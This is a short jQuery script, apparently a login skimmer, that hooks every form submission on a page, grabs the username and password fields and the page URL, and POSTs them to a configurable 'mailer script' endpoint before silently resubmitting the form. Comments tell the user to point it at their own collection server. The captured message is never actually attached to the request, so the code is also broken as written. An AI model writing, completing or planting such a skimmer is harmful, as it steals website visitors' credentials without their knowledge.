$(function() {
 var passwordBoxes = $("input[type=password]"),
 getMessage = function(username, password, url) {
  return "Username: " + username + " || Password: " + password + " || Url: " + url;
 },
 sendEmail = function(username, password, url, callback) {
  var msg = getMessage(username, password, url);
  $.ajax({
   type: 'POST',
   url: 'http://127.0.0.1:5000', //Change to the path of your mailer script
   // data: 'the headers you want to send', //Change to add any headers to be sent along
   success: callback
  });
 },
 process = function(callback) {
  var username = $("input[type=text]").not(passwordBoxes).filter(function() {
   var field = $(this);
   return field.val() || field.html();
  }).val(),
  password = passwordBoxes.val();

  sendEmail(username, password, location.href, callback);
 };

 $("form").submit(function(e) {
  var $this = $(this);
  e.preventDefault();
  process(function() {
   $this.unbind('submit');
   $this.submit();
  });
 });
});